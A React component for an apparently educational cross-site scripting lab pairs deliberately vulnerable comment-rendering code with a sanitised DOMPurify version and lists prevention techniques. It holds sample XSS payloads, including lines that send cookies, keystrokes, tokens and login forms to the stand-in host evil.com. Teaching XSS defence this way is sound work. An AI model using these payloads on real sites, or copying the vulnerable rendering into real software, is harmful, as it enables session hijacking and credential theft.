import React from 'react';
import { VulnerabilityConfig, TestResult } from '../SecurityLabDashboard';
import { VulnerabilityLabTemplate } from './VulnerabilityLabTemplate';

interface XSSLabProps {
  config: VulnerabilityConfig;
  enabled: boolean;
  onToggle: () => void;
  onTest: (vulnType: string, payload: string, target?: string) => Promise<TestResult>;
  testResults: TestResult[];
}

export const XSSLab: React.FC<XSSLabProps> = ({
  config,
  enabled,
  onToggle,
  onTest,
  testResults
}) => {
  const vulnerableCode = `// VULNERABLE CODE - Dangerous HTML Rendering
const CommentDisplay = ({ comment }) => {
  return (
    <div className="comment-content">
      {/* DANGER: Executes any JavaScript */}
      <div 
        dangerouslySetInnerHTML={{ __html: comment.content }}
        className="prose"
      />
      <div className="comment-meta">
        By: {comment.user.firstName} {comment.user.lastName}
      </div>
    </div>
  );
};

// Backend - No sanitization
app.post('/api/comments/task/:taskId', async (req, res) => {
  const { content } = req.body;
  
  // DANGER: Storing raw HTML without sanitization
  const comment = await prisma.comment.create({
    data: {
      content, // Raw content stored directly
      taskId: parseInt(req.params.taskId),
      userId: req.user.id
    }
  });
  
  res.json(comment);
});`;

  const secureCode = `// SECURE CODE - Safe HTML Rendering
import DOMPurify from 'dompurify';

const CommentDisplay = ({ comment }) => {
  // Sanitize HTML content
  const sanitizedContent = DOMPurify.sanitize(comment.content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
    ALLOWED_ATTR: []
  });
  
  return (
    <div className="comment-content">
      {/* Safe: HTML is sanitized */}
      <div 
        dangerouslySetInnerHTML={{ __html: sanitizedContent }}
        className="prose"
      />
      <div className="comment-meta">
        By: {comment.user.firstName} {comment.user.lastName}
      </div>
    </div>
  );
};

// Backend - Input sanitization
import DOMPurify from 'isomorphic-dompurify';

app.post('/api/comments/task/:taskId', async (req, res) => {
  const { content } = req.body;
  
  // Safe: Sanitize content before storing
  const sanitizedContent = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
    ALLOWED_ATTR: []
  });
  
  const comment = await prisma.comment.create({
    data: {
      content: sanitizedContent,
      taskId: parseInt(req.params.taskId),
      userId: req.user.id
    }
  });
  
  res.json(comment);
});`;

  const testPayloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror='alert(document.cookie)'>",
    "<svg onload='alert(\"XSS via SVG\")'>",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<body onload='alert(\"XSS\")'>",
    "<input onfocus='alert(\"XSS\")' autofocus>",
    "<details open ontoggle='alert(\"XSS\")'>",
    "<marquee onstart='alert(\"XSS\")'>"
  ];

  const xssTypes = [
    {
      type: "Stored XSS",
      description: "Malicious script stored in database and executed when viewed",
      example: "<script>fetch('/api/steal', {method:'POST', body:localStorage.token})</script>",
      impact: "Persistent attack affecting all users who view the content"
    },
    {
      type: "Reflected XSS",
      description: "Script reflected from user input in URL or form",
      example: "search?q=<script>alert('XSS')</script>",
      impact: "Requires social engineering to trick users into clicking malicious links"
    },
    {
      type: "DOM-based XSS",
      description: "Client-side script manipulation without server involvement",
      example: "document.getElementById('content').innerHTML = userInput;",
      impact: "Executes entirely in the browser, harder to detect server-side"
    }
  ];

  const attackVectors = [
    {
      vector: "Session Hijacking",
      payload: "<script>fetch('/evil.com/steal?cookie='+document.cookie)</script>",
      description: "Steal user session cookies to impersonate the victim"
    },
    {
      vector: "Credential Theft",
      payload: "<script>document.forms[0].action='http://evil.com/steal'</script>",
      description: "Redirect form submissions to attacker-controlled server"
    },
    {
      vector: "Keylogging",
      payload: "<script>document.onkeypress=function(e){fetch('/evil.com/log?key='+e.key)}</script>",
      description: "Log all keystrokes and send to attacker"
    },
    {
      vector: "Page Defacement",
      payload: "<script>document.body.innerHTML='<h1>Hacked!</h1>'</script>",
      description: "Replace page content with attacker's message"
    },
    {
      vector: "Phishing",
      payload: "<script>document.body.innerHTML='<form action=\"http://evil.com\">Login: <input name=\"user\"><input name=\"pass\" type=\"password\"><input type=\"submit\"></form>'</script>",
      description: "Display fake login form to steal credentials"
    }
  ];

  return (
    <VulnerabilityLabTemplate
      title="Cross-Site Scripting Laboratory (CWE-79)"
      description="Learn how XSS attacks work and how to prevent them using proper output encoding and Content Security Policy."
      vulnerableCode={vulnerableCode}
      secureCode={secureCode}
      enabled={enabled}
      onToggle={onToggle}
      testPayloads={testPayloads}
      onTest={onTest}
      testResults={testResults}
      vulnerabilityType="xss"
      additionalContent={
        <div className="space-y-6">
          {/* XSS Types */}
          <div className="bg-red-50 border border-red-200 rounded-lg p-4">
            <h4 className="font-semibold text-red-900 mb-3">🎯 Types of XSS Attacks</h4>
            <div className="space-y-4">
              {xssTypes.map((xss, index) => (
                <div key={index} className="border-l-4 border-red-400 pl-4">
                  <h5 className="font-medium text-red-900">{xss.type}</h5>
                  <p className="text-sm text-red-700 mb-2">{xss.description}</p>
                  <code className="block bg-red-100 p-2 rounded text-xs font-mono text-red-800">
                    {xss.example}
                  </code>
                  <p className="text-xs text-red-600 mt-1 italic">{xss.impact}</p>
                </div>
              ))}
            </div>
          </div>

          {/* Attack Vectors */}
          <div className="bg-orange-50 border border-orange-200 rounded-lg p-4">
            <h4 className="font-semibold text-orange-900 mb-3">⚔️ Common Attack Vectors</h4>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {attackVectors.map((attack, index) => (
                <div key={index} className="bg-white border border-orange-200 rounded p-3">
                  <h5 className="font-medium text-orange-800 mb-1">{attack.vector}</h5>
                  <p className="text-xs text-orange-700 mb-2">{attack.description}</p>
                  <code className="block bg-orange-100 p-2 rounded text-xs font-mono text-orange-800 break-all">
                    {attack.payload.length > 60 ? `${attack.payload.substring(0, 60)}...` : attack.payload}
                  </code>
                </div>
              ))}
            </div>
          </div>

          {/* Prevention Techniques */}
          <div className="bg-green-50 border border-green-200 rounded-lg p-4">
            <h4 className="font-semibold text-green-900 mb-3">🛡️ Prevention Techniques</h4>
            <div className="space-y-4">
              <div>
                <h5 className="font-medium text-green-800">1. Output Encoding</h5>
                <p className="text-sm text-green-700 mb-2">Encode all user data before displaying</p>
                <code className="block bg-green-100 p-2 rounded text-xs font-mono text-green-800">
                  {`const safe = DOMPurify.sanitize(userInput);`}
                </code>
              </div>
              
              <div>
                <h5 className="font-medium text-green-800">2. Content Security Policy (CSP)</h5>
                <p className="text-sm text-green-700 mb-2">Restrict script execution sources</p>
                <code className="block bg-green-100 p-2 rounded text-xs font-mono text-green-800">
                  {`Content-Security-Policy: script-src 'self'`}
                </code>
              </div>
              
              <div>
                <h5 className="font-medium text-green-800">3. Input Validation</h5>
                <p className="text-sm text-green-700 mb-2">Validate and sanitize all inputs</p>
                <code className="block bg-green-100 p-2 rounded text-xs font-mono text-green-800">
                  {`if (!/^[a-zA-Z0-9\\s]+$/.test(input)) reject();`}
                </code>
              </div>
              
              <div>
                <h5 className="font-medium text-green-800">4. HttpOnly Cookies</h5>
                <p className="text-sm text-green-700 mb-2">Prevent JavaScript access to session cookies</p>
                <code className="block bg-green-100 p-2 rounded text-xs font-mono text-green-800">
                  {`Set-Cookie: sessionId=abc123; HttpOnly; Secure`}
                </code>
              </div>
            </div>
          </div>

          {/* Browser Security Features */}
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
            <h4 className="font-semibold text-blue-900 mb-3">🌐 Browser Security Features</h4>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <h5 className="font-medium text-blue-800">XSS Auditor (Legacy)</h5>
                <p className="text-sm text-blue-700">Built-in browser protection (now deprecated)</p>
              </div>
              <div>
                <h5 className="font-medium text-blue-800">Same-Origin Policy</h5>
                <p className="text-sm text-blue-700">Restricts cross-origin script access</p>
              </div>
              <div>
                <h5 className="font-medium text-blue-800">Trusted Types</h5>
                <p className="text-sm text-blue-700">Modern API to prevent DOM XSS</p>
              </div>
              <div>
                <h5 className="font-medium text-blue-800">Subresource Integrity</h5>
                <p className="text-sm text-blue-700">Verify external script integrity</p>
              </div>
            </div>
          </div>

          {/* Real-World Impact */}
          <div className="bg-purple-50 border border-purple-200 rounded-lg p-4">
            <h4 className="font-semibold text-purple-900 mb-3">🌍 Real-World Impact</h4>
            <div className="space-y-2 text-sm text-purple-800">
              <p><strong>MySpace Samy Worm (2005):</strong> Self-propagating XSS worm infected 1 million users in 20 hours</p>
              <p><strong>Twitter (2010):</strong> XSS vulnerability allowed automatic retweeting and following</p>
              <p><strong>eBay (2014):</strong> Stored XSS in listing descriptions compromised user accounts</p>
              <p><strong>Yahoo (2013):</strong> XSS in Yahoo Mail allowed email theft and account takeover</p>
            </div>
          </div>
        </div>
      }
    />
  );
};